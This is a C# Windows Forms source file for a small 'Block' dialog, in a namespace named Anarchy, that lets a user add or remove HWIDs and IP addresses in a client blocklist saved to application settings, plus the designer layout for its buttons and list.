using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Windows.Forms;
using ReaLTaiizor.Controls;
using ReaLTaiizor.Forms;
using Settings = Anarchy.Helpers.Settings;

namespace Anarchy.Forms;

public class FormBlockClients : PoisonForm
{
    private IContainer components;

    private System.Windows.Forms.GroupBox groupBox1;

    private ListBox listBlocked;

    private Label label1;

    public TextBox txtBlock;

    private ReaLTaiizor.Controls.Button btnDelete;

    private ReaLTaiizor.Controls.Button btnAdd;

    private PictureBox pictureBox1;

    private MetroControlBox metroControlBox1;

    public FormBlockClients()
    {
        this.InitializeComponent();
    }

    private void BtnAdd_Click(object sender, EventArgs e)
    {
        try
        {
            this.listBlocked.Items.Add(this.txtBlock.Text);
            this.txtBlock.Clear();
        }
        catch
        {
        }
    }

    private void BtnDelete_Click(object sender, EventArgs e)
    {
        try
        {
            for (int num = this.listBlocked.SelectedIndices.Count - 1; num >= 0; num--)
            {
                this.listBlocked.Items.RemoveAt(this.listBlocked.SelectedIndices[num]);
            }
        }
        catch
        {
        }
    }

    private void FormBlockClients_Load(object sender, EventArgs e)
    {
        try
        {
            this.listBlocked.Items.Clear();
            if (string.IsNullOrWhiteSpace(Properties.Settings.Default.txtBlocked))
            {
                return;
            }
            string[] array;
            array = Properties.Settings.Default.txtBlocked.Split(',');
            foreach (string text in array)
            {
                if (!string.IsNullOrWhiteSpace(text))
                {
                    this.listBlocked.Items.Add(text);
                }
            }
        }
        catch
        {
        }
    }

    private void FormBlockClients_FormClosed(object sender, FormClosedEventArgs e)
    {
        try
        {
            lock (Settings.Blocked)
            {
                Settings.Blocked.Clear();
                List<string> list;
                list = new List<string>();
                foreach (string item in this.listBlocked.Items)
                {
                    list.Add(item);
                    Settings.Blocked.Add(item);
                }
                Properties.Settings.Default.txtBlocked = string.Join(",", list);
                Properties.Settings.Default.Save();
            }
        }
        catch
        {
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormBlockClients));
        this.groupBox1 = new System.Windows.Forms.GroupBox();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.btnDelete = new ReaLTaiizor.Controls.Button();
        this.btnAdd = new ReaLTaiizor.Controls.Button();
        this.listBlocked = new System.Windows.Forms.ListBox();
        this.label1 = new System.Windows.Forms.Label();
        this.txtBlock = new System.Windows.Forms.TextBox();
        this.metroControlBox1 = new ReaLTaiizor.Controls.MetroControlBox();
        this.groupBox1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        base.SuspendLayout();
        this.groupBox1.Controls.Add(this.pictureBox1);
        this.groupBox1.Controls.Add(this.btnDelete);
        this.groupBox1.Controls.Add(this.btnAdd);
        this.groupBox1.Controls.Add(this.listBlocked);
        this.groupBox1.Controls.Add(this.label1);
        this.groupBox1.Controls.Add(this.txtBlock);
        this.groupBox1.Location = new System.Drawing.Point(13, 21);
        this.groupBox1.Margin = new System.Windows.Forms.Padding(2);
        this.groupBox1.Name = "groupBox1";
        this.groupBox1.Padding = new System.Windows.Forms.Padding(2);
        this.groupBox1.Size = new System.Drawing.Size(543, 231);
        this.groupBox1.TabIndex = 4;
        this.groupBox1.TabStop = false;
        this.groupBox1.Text = "Blocklist";
        this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
        this.pictureBox1.Location = new System.Drawing.Point(62, 126);
        this.pictureBox1.Name = "pictureBox1";
        this.pictureBox1.Size = new System.Drawing.Size(93, 100);
        this.pictureBox1.TabIndex = 10;
        this.pictureBox1.TabStop = false;
        this.btnDelete.BackColor = System.Drawing.Color.Transparent;
        this.btnDelete.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnDelete.EnteredColor = System.Drawing.Color.FromArgb(32, 34, 37);
        this.btnDelete.Font = new System.Drawing.Font("Roboto", 11.25f, System.Drawing.FontStyle.Bold);
        this.btnDelete.Image = null;
        this.btnDelete.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
        this.btnDelete.InactiveColor = System.Drawing.Color.FromArgb(32, 34, 37);
        this.btnDelete.Location = new System.Drawing.Point(139, 81);
        this.btnDelete.Name = "btnDelete";
        this.btnDelete.PressedColor = System.Drawing.Color.FromArgb(165, 37, 37);
        this.btnDelete.Size = new System.Drawing.Size(58, 36);
        this.btnDelete.TabIndex = 9;
        this.btnDelete.Text = "Del";
        this.btnDelete.TextAlignment = System.Drawing.StringAlignment.Center;
        this.btnDelete.Click += new System.EventHandler(BtnDelete_Click);
        this.btnAdd.BackColor = System.Drawing.Color.Transparent;
        this.btnAdd.Cursor = System.Windows.Forms.Cursors.Hand;
        this.btnAdd.EnteredColor = System.Drawing.Color.FromArgb(32, 34, 37);
        this.btnAdd.Font = new System.Drawing.Font("Roboto", 11.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.btnAdd.Image = null;
        this.btnAdd.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
        this.btnAdd.InactiveColor = System.Drawing.Color.FromArgb(32, 34, 37);
        this.btnAdd.Location = new System.Drawing.Point(25, 81);
        this.btnAdd.Name = "btnAdd";
        this.btnAdd.PressedColor = System.Drawing.Color.FromArgb(165, 37, 37);
        this.btnAdd.Size = new System.Drawing.Size(58, 36);
        this.btnAdd.TabIndex = 8;
        this.btnAdd.Text = "Add";
        this.btnAdd.TextAlignment = System.Drawing.StringAlignment.Center;
        this.btnAdd.Click += new System.EventHandler(BtnAdd_Click);
        this.listBlocked.DataBindings.Add(new System.Windows.Forms.Binding("Name", Properties.Settings.Default, "txtBlocked", true, System.Windows.Forms.DataSourceUpdateMode.OnPropertyChanged));
        this.listBlocked.Font = new System.Drawing.Font("monofur for Powerline", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.listBlocked.FormattingEnabled = true;
        this.listBlocked.ItemHeight = 11;
        this.listBlocked.Location = new System.Drawing.Point(225, 30);
        this.listBlocked.Margin = new System.Windows.Forms.Padding(2);
        this.listBlocked.Name = Properties.Settings.Default.txtBlocked;
        this.listBlocked.SelectionMode = System.Windows.Forms.SelectionMode.MultiSimple;
        this.listBlocked.Size = new System.Drawing.Size(297, 169);
        this.listBlocked.TabIndex = 4;
        this.label1.AutoSize = true;
        this.label1.Location = new System.Drawing.Point(4, 34);
        this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(89, 13);
        this.label1.TabIndex = 1;
        this.label1.Text = "Input HWID or IP";
        this.txtBlock.Location = new System.Drawing.Point(7, 56);
        this.txtBlock.Margin = new System.Windows.Forms.Padding(2);
        this.txtBlock.Name = "txtBlock";
        this.txtBlock.Size = new System.Drawing.Size(208, 20);
        this.txtBlock.TabIndex = 0;
        this.metroControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.metroControlBox1.CloseHoverBackColor = System.Drawing.Color.FromArgb(183, 40, 40);
        this.metroControlBox1.CloseHoverForeColor = System.Drawing.Color.White;
        this.metroControlBox1.CloseNormalForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.metroControlBox1.DefaultLocation = ReaLTaiizor.Enum.Metro.LocationType.Normal;
        this.metroControlBox1.DisabledForeColor = System.Drawing.Color.DimGray;
        this.metroControlBox1.IsDerivedStyle = true;
        this.metroControlBox1.Location = new System.Drawing.Point(462, 0);
        this.metroControlBox1.MaximizeBox = false;
        this.metroControlBox1.MaximizeHoverBackColor = System.Drawing.Color.FromArgb(238, 238, 238);
        this.metroControlBox1.MaximizeHoverForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.MaximizeNormalForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.MinimizeBox = false;
        this.metroControlBox1.MinimizeHoverBackColor = System.Drawing.Color.FromArgb(238, 238, 238);
        this.metroControlBox1.MinimizeHoverForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.MinimizeNormalForeColor = System.Drawing.Color.Gray;
        this.metroControlBox1.Name = "metroControlBox1";
        this.metroControlBox1.Size = new System.Drawing.Size(100, 25);
        this.metroControlBox1.Style = ReaLTaiizor.Enum.Metro.Style.Light;
        this.metroControlBox1.StyleManager = null;
        this.metroControlBox1.TabIndex = 11;
        this.metroControlBox1.Text = "metroControlBox1";
        this.metroControlBox1.ThemeAuthor = "Taiizor";
        this.metroControlBox1.ThemeName = "MetroLight";
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        base.ClientSize = new System.Drawing.Size(563, 262);
        base.Controls.Add(this.metroControlBox1);
        base.Controls.Add(this.groupBox1);
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Margin = new System.Windows.Forms.Padding(2);
        base.MaximizeBox = false;
        base.Name = "FormBlockClients";
        base.Opacity = 0.97;
        base.Padding = new System.Windows.Forms.Padding(20, 65, 20, 22);
        base.Resizable = false;
        base.ShowIcon = false;
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent;
        base.Style = ReaLTaiizor.Enum.Poison.ColorStyle.White;
        this.Text = "Block";
        base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormBlockClients_FormClosed);
        base.Load += new System.EventHandler(FormBlockClients_Load);
        this.groupBox1.ResumeLayout(false);
        this.groupBox1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
        base.ResumeLayout(false);
    }
}